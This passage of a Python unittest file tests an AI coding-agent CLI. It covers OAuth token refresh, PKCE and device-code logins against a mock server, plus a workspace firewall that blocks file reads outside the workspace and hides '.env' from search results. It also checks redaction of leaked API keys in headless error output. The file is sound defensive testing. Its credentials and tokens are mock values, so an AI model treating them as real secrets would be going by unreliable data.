                        self.wfile.write(json.dumps({"access_token": "fresh_adc_token_v2", "expires_in": 3600}).encode("utf-8"))
                        return
                    if grant == "authorization_code":
                        self.send_response(200)
                        self.send_header("Content-Type", "application/json")
                        self.end_headers()
                        self.wfile.write(
                            json.dumps(
                                {"access_token": "pkce_access_tok", "refresh_token": "pkce_ref_tok", "expires_in": 3600}
                            ).encode("utf-8")
                        )
                        return
                    if grant == "urn:ietf:params:oauth:grant-type:device_code":
                        state["device_polls"] += 1
                        if state["device_polls"] == 1:
                            self.send_response(400)
                            self.send_header("Content-Type", "application/json")
                            self.end_headers()
                            self.wfile.write(json.dumps({"error": "authorization_pending"}).encode("utf-8"))
                            return
                        self.send_response(200)
                        self.send_header("Content-Type", "application/json")
                        self.end_headers()
                        self.wfile.write(
                            json.dumps({"access_token": "device_access_tok", "refresh_token": "dev_ref", "expires_in": 3600}).encode("utf-8")
                        )
                        return

                if self.path == "/oauth2/device":
                    self.send_response(200)
                    self.send_header("Content-Type", "application/json")
                    self.end_headers()
                    self.wfile.write(
                        json.dumps(
                            {
                                "device_code": "dev_code_123",
                                "user_code": "ABCD-EFGH",
                                "verification_uri": "https://auth.example/activate",
                                "interval": 1,
                                "expires_in": 120,
                            }
                        ).encode("utf-8")
                    )
                    return

                # 3. Vertex endpoint returning 401 on stale token, 200 on refreshed token
                if ":streamGenerateContent" in self.path:
                    state["vtx_attempts"] += 1
                    auth_hdr = self.headers.get("Authorization", "")
                    if auth_hdr != "Bearer fresh_adc_token_v2":
                        self.send_response(401)
                        self.send_header("Content-Type", "application/json")
                        self.end_headers()
                        self.wfile.write(b'{"error":{"code":401,"message":"UNAUTHENTICATED"}}')
                        return
                    self.send_response(200)
                    self.send_header("Content-Type", "text/event-stream")
                    self.end_headers()
                    evt = {
                        "candidates": [
                            {"content": {"role": "model", "parts": [{"text": "Refreshed 401 OK"}]}, "finishReason": "STOP"}
                        ]
                    }
                    self.wfile.write(f"data: {json.dumps(evt)}\n\n".encode("utf-8"))
                    return

                self.send_response(404)
                self.end_headers()

        srv = ThreadingHTTPServer(("127.0.0.1", 0), _FaultHandler)
        srv.daemon_threads = True
        t = threading.Thread(target=srv.serve_forever, daemon=True)
        t.start()
        base = f"http://127.0.0.1:{srv.server_address[1]}"

        try:
            with tempfile.TemporaryDirectory() as tmp:
                root = pathlib.Path(tmp)
                adc_path = root / "adc.json"
                adc_path.write_text(
                    json.dumps(
                        {
                            "type": "authorized_user",
                            "client_id": "cid_test",
                            "client_secret": "csec_test",
                            "refresh_token": "rtok_test",
                            "token_uri": f"{base}/oauth2/token",
                        }
                    ),
                    encoding="utf-8",
                )
                with mock.patch.dict(
                    os.environ,
                    {
                        "USH_DISABLE_KEYCHAIN": "1",
                        "GOOGLE_APPLICATION_CREDENTIALS": str(adc_path),
                    },
                    clear=False,
                ):
                    vault = CredentialVault(root / "ush_home", probe_ambient=False)
                    sleeps: list[float] = []
                    client = UniversalModelClient(
                        vault,
                        HttpProviderTransport(vault),
                        max_api_attempts=4,
                        sleep_fn=lambda s: sleeps.append(s),
                    )

                    # 5a. Mid-connect socket drop recovery (`RemoteDisconnected` -> automatic reconnect)
                    flaky_prof = vault.register_api_key_profile(
                        "flaky",
                        "litellm",
                        "sk-flaky",
                        base_url=f"{base}/flaky-socket/v1",
                        default_model="gpt-4.1",
                    )
                    m_sock = client.generate(
                        profile=resolve_model_profile("litellm:gpt-4.1", "litellm"),
                        auth_profile=flaky_prof,
                        system_prompt="sys",
                        history=[CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="hi")])],
                        tools=[],
                        session_id="s_sock",
                    )
                    self.assertEqual(m_sock.plain_text(), "Socket drop recovered")
                    self.assertEqual(state["drop_attempts"], 2)

                    # 5b. HTTP 401 -> `invalidate_token_cache` -> direct `authorized_user` ADC token refresh -> 200 OK
                    vtx_prof = vault.register_vertex_profile(
                        "vtx-adc",
                        project_id="proj-sec",
                        region="global",
                        base_url=base,
                    )
                    vault._gcloud_token_cache = ("stale_expired_token_v1", time.time() + 3600)
                    events: list[str] = []
                    m_401 = client.generate(
                        profile=resolve_model_profile("gemini-3.1-pro-preview", "vertex"),
                        auth_profile=vtx_prof,
                        system_prompt="sys",
                        history=[CanonicalMessage(role="user", parts=[CanonicalPart(kind="text", text="refresh me")])],
                        tools=[],
                        session_id="s_401",
                        on_event=lambda e: events.append(str((e.meta or {}).get("event", ""))),
                    )
                    self.assertEqual(m_401.plain_text(), "Refreshed 401 OK")
                    self.assertIn("auth_refresh", events)
                    self.assertEqual(state["adc_refreshes"], 1)

                    # 5c. PKCE S256 math + CSRF `state` mismatch abort + valid headless callback exchange
                    verifier, challenge = generate_pkce_pair()
                    expected_chal = base64.urlsafe_b64encode(hashlib.sha256(verifier.encode("ascii")).digest()).rstrip(b"=").decode("ascii")
                    self.assertEqual(challenge, expected_chal)

                    with contextlib.redirect_stdout(io.StringIO()):
                        with mock.patch("builtins.input", return_value="http://127.0.0.1:9999/oauth/callback?code=abc&state=TAMPERED"):
                            with self.assertRaises(RuntimeError):
                                run_oauth_pkce_login(
                                    vault,
                                    profile_name="pkce-tampered",
                                    provider="openai",
                                    authorize_url=f"{base}/oauth2/auth",
                                    token_url=f"{base}/oauth2/token",
                                    client_id="cid",
                                    scopes=["openid"],
                                    base_url=base,
                                    no_browser=True,
                                )

                        # Valid headless code input stores `0600` vault secret cleanly
                        with mock.patch("builtins.input", return_value="auth_code_ok_123"):
                            pkce_prof = run_oauth_pkce_login(
                                vault,
                                profile_name="pkce-ok",
                                provider="openai",
                                authorize_url=f"{base}/oauth2/auth",
                                token_url=f"{base}/oauth2/token",
                                client_id="cid",
                                scopes=["openid"],
                                base_url=base,
                                no_browser=True,
                            )
                        self.assertEqual(vault.resolve_bearer_or_key(pkce_prof), "pkce_access_tok")
                        mode_bits = vault.fallback_vault_path.stat().st_mode & 0o777
                        self.assertEqual(mode_bits, 0o600)

                        # 5d. RFC 8628 Device-Code flow (`authorization_pending` -> `access_token`)
                        with mock.patch("ush.auth.vault.time.sleep", return_value=None):
                            dev_prof = run_oauth_device_code_login(
                                vault,
                                profile_name="dev-ok",
                                provider="openai",
                                device_code_url=f"{base}/oauth2/device",
                                token_url=f"{base}/oauth2/token",
                                client_id="cid",
                                scopes=["openid"],
                                base_url=base,
                            )
                    self.assertEqual(vault.resolve_bearer_or_key(dev_prof), "device_access_tok")
                    self.assertEqual(state["device_polls"], 2)
        finally:
            srv.shutdown()
            srv.server_close()

    # =========================================================================
    # 6. Built-In Tool Boundaries & Headless CLI `-p` Contracts
    # =========================================================================

    def test_builtin_tools_completeness_and_headless_cli_contracts(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            root = pathlib.Path(tmp).resolve()
            ws = root / "ws"
            ext_skill_root = root / "external_skills" / "sec-audit"
            home = root / "ush_home"
            ws.mkdir()
            (ext_skill_root / "references").mkdir(parents=True)
            (ext_skill_root / "SKILL.md").write_text(
                "---\nname: sec-audit\ndescription: Security audit helper\n---\nCheck `references/checklist.md`.\n",
                encoding="utf-8",
            )
            checklist_file = ext_skill_root / "references" / "checklist.md"
            checklist_file.write_text("# Checklist\n- Verify mTLS\n", encoding="utf-8")

            # Put a secret in `.env` containing `NEEDLE_TOKEN` and a normal source file containing `NEEDLE_TOKEN`
            (ws / ".env").write_text("API_SECRET=NEEDLE_TOKEN\n", encoding="utf-8")
            (ws / "engine.py").write_text(
                'class WidgetEngine:\n    """Core widget engine."""\n    def compute_score(self, x: int) -> int:\n        # NEEDLE_TOKEN ref\n        return x * 2\n\n'
                "def run_widget() -> int:\n    return WidgetEngine().compute_score(21)\n",
                encoding="utf-8",
            )
            # Tiny valid 1x1 PNG
            png_bytes = base64.b64decode(
                "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII="
            )
            (ws / "pixel.png").write_bytes(png_bytes)

            fw = SecurityFirewall(ws)
            sk_mgr = SkillManager(
                ws,
                ush_home=home,
                is_workspace_trusted=True,
                extension_skill_dirs=[root / "external_skills"],
                include_user_ecosystem_dirs=False,
            )
            # External skill outside workspace: before `activate_skill`, reading `checklist_file` is blocked!
            with self.assertRaises(PermissionError):
                fw.resolve_and_validate(checklist_file)

            reg = build_default_tool_registry()
            pty = PersistentPtyManager(ws)
            try:
                def _ctx(cid: str, ask_cb=None) -> ToolExecutionContext:
                    return ToolExecutionContext(
                        call_id=cid,
                        firewall=fw,
                        stale_tracker=StaleReadTracker(),
                        pty=pty,
                        policy_engine=PolicyEngine(),
                        mode=PermissionMode.YOLO,
                        ask_user_callback=ask_cb,
                        skill_activate_callback=lambda name: sk_mgr.activate(name, fw),
                    )

                batch_out = reg.dispatch_batch(
                    [
                        CanonicalPart(kind="tool_call", tool_call_id="t1", tool_name="glob_files", tool_args={"pattern": "*.py", "skeleton": True}),
                        CanonicalPart(kind="tool_call", tool_call_id="t2", tool_name="grep_files", tool_args={"pattern": "NEEDLE_TOKEN"}),
                        CanonicalPart(kind="tool_call", tool_call_id="t3", tool_name="lsp_query", tool_args={"action": "references", "symbol": "compute_score"}),
                        CanonicalPart(kind="tool_call", tool_call_id="t4", tool_name="read_file", tool_args={"path": "pixel.png"}),
                        CanonicalPart(kind="tool_call", tool_call_id="t5", tool_name="activate_skill", tool_args={"name": "sec-audit"}),
                        CanonicalPart(kind="tool_call", tool_call_id="t6", tool_name="write_file", tool_args={"path": "notes/out.txt", "content": "written atomically\n"}),
                        CanonicalPart(kind="tool_call", tool_call_id="t7", tool_name="ask_user", tool_args={"question": "Proceed?", "options": ["yes", "no"]}),
                    ],
                    _ctx,
                )
                self.assertIn("class WidgetEngine", batch_out[0].text)
                self.assertIn("engine.py", batch_out[1].text)
                # `.env` MUST NEVER appear in `grep_files` output!
                self.assertNotIn(".env", batch_out[1].text)
                self.assertIn("engine.py:", batch_out[2].text)
                self.assertEqual(batch_out[3].mime_type, "image/png")
                self.assertTrue(bool(batch_out[3].base64_data))
                self.assertIn("sec-audit", batch_out[4].text)
                # After `activate_skill`, bundled `references/checklist.md` outside workspace is now readable!
                self.assertEqual(fw.resolve_and_validate(checklist_file), checklist_file.resolve())
                self.assertEqual((ws / "notes" / "out.txt").read_text(encoding="utf-8"), "written atomically\n")
                self.assertIn("Autonomous headless mode", batch_out[6].text)
            finally:
                pty.close_all()

            # --- Headless CLI (`crux -p --output-format text|json|stream-json` & `crux doctor`) ---
            def _fake_stream_turn(
                _self_tp: HttpProviderTransport,
                *,
                profile: ModelCapabilityProfile,
                auth_profile: AuthProfile,
                system_prompt: str,
                messages: list[CanonicalMessage],
                tools: list[dict[str, Any]],
                session_id: str,
                on_event=None,
            ) -> CanonicalMessage:
                u_txt = messages[-1].plain_text()
                if "FAIL_WITH_KEY" in u_txt:
                    raise WireError(422, "Upstream validation error with sk-proj-SECRETKEY0123456789abcdefghij")
                if on_event:
                    from ush.core.types import StreamEvent

                    on_event(StreamEvent(kind="text_delta", text="Headless OK"))
                return CanonicalMessage(
                    role="assistant",
                    producer_provider=profile.provider,
                    producer_model_id=profile.model_id,
                    parts=[CanonicalPart(kind="text", text="Headless OK")],
                )

            with mock.patch.dict(
                os.environ,
                {
                    "USH_HOME": str(home),
                    "USH_DISABLE_KEYCHAIN": "1",
                    "GEMINI_API_KEY": "AIzaMockKey123456789012345678901234",
                },
                clear=False,
            ):
                # `crux doctor` smoke check
                doc_out = io.StringIO()
                with mock.patch("sys.stdout", doc_out):
                    rc_doc = cli_main(["-C", str(ws), "doctor"])
                self.assertEqual(rc_doc, 0)
                self.assertIn("Health Check", doc_out.getvalue())

                with mock.patch.object(HttpProviderTransport, "stream_turn", _fake_stream_turn):
                    # 1. `--output-format json` schema check
                    json_out = io.StringIO()
                    with mock.patch("sys.stdout", json_out):
                        rc_j = cli_main(["-C", str(ws), "-p", "hello json", "--output-format", "json"])
                    self.assertEqual(rc_j, 0)
                    parsed_j = json.loads(json_out.getvalue())
                    self.assertEqual(parsed_j["response"], "Headless OK")
                    self.assertEqual(parsed_j["stop_reason"], "STOP")
                    self.assertIn("session_id", parsed_j)

                    # 2. `--output-format stream-json` NDJSON event check
                    sjson_out = io.StringIO()
                    with mock.patch("sys.stdout", sjson_out):
                        rc_sj = cli_main(["-C", str(ws), "-p", "hello stream", "--output-format", "stream-json"])
                    self.assertEqual(rc_sj, 0)
                    frames = [json.loads(ln) for ln in sjson_out.getvalue().splitlines() if ln.strip()]
                    self.assertTrue(any(f.get("type") == "text_delta" and f.get("text") == "Headless OK" for f in frames))

                    # 3. Error path redacts leaked API keys in JSON output and returns exit code 1
                    err_out = io.StringIO()
                    with mock.patch("sys.stdout", err_out):
                        rc_err = cli_main(["-C", str(ws), "-p", "FAIL_WITH_KEY", "--output-format", "json"])
                    self.assertEqual(rc_err, 1)
                    parsed_err = json.loads(err_out.getvalue())
                    self.assertNotIn("sk-proj-", parsed_err["error"])
                    self.assertIn("[REDACTED_SECRET]", parsed_err["error"])


if __name__ == "__main__":
    unittest.main(verbosity=2)
